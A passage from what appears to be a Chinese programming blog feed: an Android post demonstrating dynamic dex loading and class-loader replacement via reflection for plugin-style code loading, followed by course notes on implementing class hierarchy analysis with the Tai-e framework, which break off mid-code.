class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.test01;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">// 动态加载时</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClass</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TestDynamicLoading</span><span class="hljs-params">()</span>  &#123;<br>        Log.i(<span class="hljs-string">&quot;nuthecz&quot;</span>, <span class="hljs-string">&quot;this is a test from TestClass&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// ClassLoader修正时</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TestDynamicLoading</span><span class="hljs-params">(Bundle savedInstanceState)</span>  &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        Log.i(<span class="hljs-string">&quot;nuthecz&quot;</span>, <span class="hljs-string">&quot;this is a test from TestClass.onCreate&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射替换"><a class="markdownIt-Anchor" href="#反射替换"></a> 反射替换</h3><p>​这里就是尝试替换Android应用程序中当前活动线程的类加载器。这通常用于插件化开发或热更新功能，允许应用程序在运行时加载和执行新的代码。</p><p>​这里如果存在报错<code>FLAG_ACTIVITY_NEW_TASK flag. Is this really what you want?</code> 这样的，就需要对于 intent 增加标志，看<a href="https://www.cnblogs.com/shaweng/archive/2012/06/29/2570394.html">这篇文章</a>。同时注意可能会出现对于xml文件的报错，这个时候就需要在AndroidManifest.xml文件中新添加引用的组件类的activity标签。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.testre;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.ArrayMap;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.ref.WeakReference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">import</span> dalvik.system.DexClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nuthecz&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        Log.i(TAG, <span class="hljs-string">&quot;start test&quot;</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">appcontext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getApplicationContext();<br>        testStartAcitivityFirstMethod(appcontext, <span class="hljs-string">&quot;sdcard/classes3_2.dex&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 替换当前应用的类加载器。</span><br><span class="hljs-comment">     * 该方法通过反射机制操作Android系统的内部类和字段，以实现替换应用的类加载器的功能。</span><br><span class="hljs-comment">     * 注意：此操作通常需要较高的权限，并且可能对应用的稳定性产生影响，使用时应谨慎。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classloader 待替换的类加载器对象。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceClassloader</span><span class="hljs-params">(ClassLoader classloader)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 加载android.app.ActivityThread类并获取当前的ActivityThread实例</span><br>            Class&lt;?&gt; activityThreadClass = Class.forName(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, <span class="hljs-literal">false</span>, classloader);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">currentActivityThreadMethod</span> <span class="hljs-operator">=</span> activityThreadClass.getDeclaredMethod(<span class="hljs-string">&quot;currentActivityThread&quot;</span>);<br>            currentActivityThreadMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">activityThreadObj</span> <span class="hljs-operator">=</span> currentActivityThreadMethod.invoke(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-comment">// 获取并访问ActivityThread的mPackages字段，它管理着所有已加载包的信息</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mpackagesField</span> <span class="hljs-operator">=</span> activityThreadClass.getDeclaredField(<span class="hljs-string">&quot;mPackages&quot;</span>);<br>            mpackagesField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mpackagesobj</span> <span class="hljs-operator">=</span> mpackagesField.get(activityThreadObj);<br><br>            <span class="hljs-comment">// 根据当前应用的包名获取对应的LoadedApk的WeakReference对象</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">weakReferenceObj</span> <span class="hljs-operator">=</span> ((ArrayMap) mpackagesobj).get(<span class="hljs-built_in">this</span>.getPackageName());<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">loadedApkobj</span> <span class="hljs-operator">=</span> ((WeakReference) weakReferenceObj).get();<br><br>            <span class="hljs-comment">// 加载android.app.LoadedApk类并获取其mClassLoader字段</span><br>            Class&lt;?&gt; loadedApkclazz = Class.forName(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-literal">false</span>, classloader);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mClassloader</span> <span class="hljs-operator">=</span> loadedApkclazz.getDeclaredField(<span class="hljs-string">&quot;mClassLoader&quot;</span>);<br>            mClassloader.setAccessible(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// 如果LoadedApk实例不为空，则替换其类加载器</span><br>            <span class="hljs-keyword">if</span> (loadedApkobj != <span class="hljs-literal">null</span>) &#123;<br>                mClassloader.set(loadedApkobj, classloader);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果LoadedApk实例为空，则记录错误信息，无法进行替换操作</span><br>                Log.e(TAG, <span class="hljs-string">&quot;loadedApkobj is null, cannot replace ClassLoader.&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | NoSuchFieldException e) &#123;<br>            <span class="hljs-comment">// 异常处理：打印堆栈跟踪信息</span><br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过DexClassLoader动态加载dex文件中的类，并启动该类对应的Activity。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文环境，用于创建文件目录和启动Activity。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> dexfilepath dex文件的路径。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStartAcitivityFirstMethod</span><span class="hljs-params">(Context context, String dexfilepath)</span>&#123;<br>        <span class="hljs-comment">// 创建优化文件目录（用于存放优化后的dex文件）和库文件目录（存放so文件）</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">optFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;opt_dex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">libFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;lib_path&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 获取当前应用的ClassLoader，主要用于后续创建DexClassLoader时作为父ClassLoader</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">pathClassLoader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader();<br><br>        <span class="hljs-comment">// 实例化DexClassLoader，用于加载外部的dex文件</span><br>        <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(dexfilepath, optFile.getAbsolutePath(),<br>                libFile.getAbsolutePath(), pathClassLoader);<br>        replaceClassloader(dexClassLoader); <span class="hljs-comment">// 将应用的ClassLoader替换为DexClassLoader，以便于加载外部类</span><br>        Class&lt;?&gt; loadClass = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 尝试从dex文件中加载指定的类</span><br>            loadClass = dexClassLoader.loadClass(<span class="hljs-string">&quot;com.example.test.Test02&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;loadClass success&quot;</span>); <span class="hljs-comment">// 如加载成功，打印日志</span><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Class not found: &quot;</span>, e); <span class="hljs-comment">// 类未找到时，打印错误日志并返回</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 创建Intent并设置标志，准备启动加载的类所对应的Activity</span><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, loadClass);<br>        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        context.startActivity(intent); <span class="hljs-comment">// 启动Activity</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="包含组件的插件dex"><a class="markdownIt-Anchor" href="#包含组件的插件dex"></a> 包含组件的插件Dex</h3><p>​贴一份代码，这里显示可以解析到dex路径，但是就是找不到指定的组件类，普通类可以找到，所以不晓得怎么处理了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.testre;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.ArrayMap;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.ref.WeakReference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">import</span> dalvik.system.DexClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nuthecz&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        Log.i(TAG, <span class="hljs-string">&quot;start test&quot;</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">appcontext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getApplicationContext();<br>        testStartAcitivitySecondMethod(appcontext, <span class="hljs-string">&quot;sdcard/classes3_2.dex&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 使用DexClassLoader从外部dex文件中加载类，并启动该类对应的Activity。</span><br><span class="hljs-comment">     * 这个方法首先创建用于存放dex文件和so文件的目录，然后实例化DexClassLoader来加载dex文件。</span><br><span class="hljs-comment">     * 加载成功后，会尝试启动dex文件中指定的类所对应的Activity。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStartAcitivitySecondMethod</span><span class="hljs-params">(Context context, String dexfilepath)</span>&#123;<br>        <span class="hljs-comment">// 创建优化文件目录和库文件目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">optFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;opt_dex&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">libFile</span> <span class="hljs-operator">=</span> context.getDir(<span class="hljs-string">&quot;lib_path&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 获取当前应用的ClassLoader和其父ClassLoader，为创建DexClassLoader做准备</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">pathClassLoader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader();<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">bootclassloader</span> <span class="hljs-operator">=</span> MainActivity.class.getClassLoader().getParent();<br><br>        <span class="hljs-comment">// 实例化DexClassLoader，用于加载外部dex文件</span><br>        <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(dexfilepath, optFile.getAbsolutePath(),<br>                libFile.getAbsolutePath(), bootclassloader);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 设置DexClassLoader为当前应用ClassLoader的父ClassLoader</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">parentField</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredField(<span class="hljs-string">&quot;parent&quot;</span>);<br>            parentField.setAccessible(<span class="hljs-literal">true</span>);<br>            parentField.set(pathClassLoader, dexClassLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>        LoadCommonClass.testClassLoadingOrder();<br>        Class&lt;?&gt; loadClass = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 尝试从dex文件加载指定的类</span><br>            loadClass = dexClassLoader.loadClass(<span class="hljs-string">&quot;com.example.test.MainActivity&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;Second loadClass Test02 success&quot;</span>); <span class="hljs-comment">// 加载成功打印日志</span><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Class Test02 not found: &quot;</span>, e); <span class="hljs-comment">// 类未找到时打印错误日志并返回</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 创建Intent并设置标志，准备启动加载的类所对应的Activity</span><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, loadClass);<br>        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        context.startActivity(intent); <span class="hljs-comment">// 启动Activity</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab4</title>
    <link href="/posts/72d49a16.html"/>
    <url>/posts/72d49a16.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab4"><a class="markdownIt-Anchor" href="#lab4"></a> Lab4</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><ul><li>MethodRef ---- 签名信息 -&gt; signature(可以理解为包含所有的信息)</li><li>对于类层次结构的相关信息，需要考虑其不同的类型进行处理，列如类，接口等</li></ul><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><p>​这里主要是实现一个类层次分析，然后实现过程间的常量传播</p><h2 id="类层次分析"><a class="markdownIt-Anchor" href="#类层次分析"></a> 类层次分析</h2><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.graph.callgraph.DefaultCallGraph</code><ul><li>该类代表了程序的调用图。它负责整个调用图的构建，包含多个关于构建调用图的 API。</li></ul></li><li><code>pascal.taie.analysis.graph.callgraph.Edge&lt;Invoke,JMethod&gt;</code><ul><li>该类表示调用图中的边，这里创建的是从调用点(Invoke)到被调用方法(JMethod)的边。在构建的时候，需要向构造方法提供调用类型、调用点和被调用方法的信息，这里的意思该类中关于创建边的方法为 <code>public Edge(CallKind kind, CallSite callSite, Method callee)</code> 传递了三个信息。同时也是 <code>DefaultCallGraph </code>类中 <code>boolean addEdge(Edge&lt;Invoke,JMethod&gt;)</code> 的参数。</li></ul></li></ul><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> ir</h3><ul><li><p><code>pascal.taie.ir.stmt.Invoke (subclass of Stmt)</code></p><ul><li>该类表示程序中的方法调用(举个例子：<code>x = o.m(a1,a2,…)</code>)以及调用图中的调用点。通过方法 <code>getMethodRef()</code> 来获取目标调用方法的签名信息。</li></ul></li><li><p><code>pascal.taie.ir.proginfo.MethodRef</code></p><ul><li>它包含了调用点所调用的目标方法的签名信息。上面 <code>getMethodRef()</code> 获取的就是目标调用方法的 MethodRef 属性。</li><li><code>JClass getDeclaringClass()</code>：返回该方法签名的<strong>声明类</strong>，即声明该方法的类，也就是 <code>A a = new B()</code> 中的类 A。它是 MethodRef 父类 MemberRef 中的方法。主要是看下面 Resolve算法中的运用</li><li><code>Subsignature getSubsignature()</code>：返回被调用方法的子签名，下面 language 有介绍。</li></ul></li></ul><h3 id="language"><a class="markdownIt-Anchor" href="#language"></a> language</h3><ul><li><p><code>pascal.taie.language.classes.Subsignature</code></p><ul><li>该类标识子签名，一个方法的子签名只包含它的方法名和方法签名的描述符。这个服务于 Dispatch 中的 m，它的要求就是方法名和描述符。</li></ul></li><li><p><code>pascal.taie.language.classes.ClassHierarchy</code></p><ul><li>该类提供了类层次结构的相关信息。主要应用在 Resolve 算法中寻找某个类所有的继承类。</li></ul></li><li><p><code>pascal.taie.language.classes.JMethod</code></p><ul><li>该类表示 Tai-e 中的 Java 方法。每个 <code>JMethod</code> 的实例关联着一个方法并包含该方法的各种信息。</li><li>这里有个疑问，它和上面的 <code>MethodRef</code> 有什么区别。这个问题要看 <code>Resolve</code> 算法中的 Dispatch 的调用语句 <code>dispatch(methodRef.getDeclaringClass(), methodRef.getSubsignature())</code>，这里传递的参数分别为 <code>JClass</code>和<code>Subsignature</code>类型，而 <code>JMethod</code> 类型可以通过下面 <code>JClass</code>中的方法进行返回，所以可以知道 MethodRef和JMethod类似，包含的信息差不多，都是一个方法的具体信息，但是各有侧重。</li></ul></li></ul><table style="border:none;text-align:center;width:auto;margin: 0 auto;"><tbody><tr><td style="padding: 6px"><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403091538345.png" ></td>      <td><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403091539476.png" ></td></tr>        <tr>        <td><strong> MethodRef </strong></td>        <td><strong> JMethod </td>        </tr></tbody></table><ul><li><code>pascal.taie.language.classes.JClass</code><ul><li>该类表示 Tai-e 中的 Java 类。每个 <code>JClass</code> 的实例关联着一个类并包含该类的各种信息。</li><li><code>JMethod getDeclaredMethod(Subsignature)</code>: 根据子签名返回该类中声明的对应方法。如果该类中没有该子签名对应的方法，则返回 <code>null</code>。</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​需要完成完成 <code>CHABuilder</code> 类的以下方法</p><ul><li><code>JMethod dispatch(JClass,Subsignature)</code> -&gt; <code>Dispatch</code> 方法</li><li><code>Set&lt;JMethod&gt; resolve(Invoke)</code> -&gt; <code>Resolve</code> 方法</li><li><code>CallGraph&lt;Invoke, JMethod&gt; buildCallGraph(JMethod)</code> -&gt; <code>BuildCallGraph</code> 算法</li></ul><h4 id="dispatch"><a class="markdownIt-Anchor" href="#dispatch"></a> dispatch</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Looks up the target method based on given class and method subsignature.</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> the dispatched target method, or null if no satisfying method</span><br><span class="hljs-comment">    * can be found.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> JMethod <span class="hljs-title function_">dispatch</span><span class="hljs-params">(JClass jclass, Subsignature subsignature)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 根据子签名返回该类中声明的对应方法，这是最后的递归出口</span><br>       <span class="hljs-type">JMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span>  jclass.getDeclaredMethod(subsignature);<br>       <span class="hljs-comment">// 这里需要注意method不是抽象方法，否则就不需要递归到父类中查找了</span><br>       <span class="hljs-keyword">if</span>(method != <span class="hljs-literal">null</span> &amp;&amp; !method.isAbstract()) <span class="hljs-keyword">return</span> method;<br><br>       <span class="hljs-comment">// 根据签名递归到父类中查找对应方法</span><br>       <span class="hljs-type">JClass</span> <span class="hljs-variable">jClass</span> <span class="hljs-operator">=</span> jclass.getSuperClass();<br>       <span class="hljs-keyword">if</span>(jClass != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> dispatch(jClass, subsignature);<br><br>       <span class="hljs-comment">// 其余情况返回null</span><br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是一个循环从子类到基类进行判断的操作，首先 <code>jclass.getDeclaredMethod</code> 根据 subsignature(包含方法的方法名和描述符)来返回该类(jclass)中声明的对应方法。然后如果该方法不为空且不是抽象方法，那就找到了目标方法，因为 Dispatch 就是从下往上找符合条件的第一个目标方法。但是如果不符合，那么就继续网上寻找，先判断父类存在与否，存在就继续网上 dispatch，不存在说明就找不到，返回 null。</p><h4 id="resolve"><a class="markdownIt-Anchor" href="#resolve"></a> resolve</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 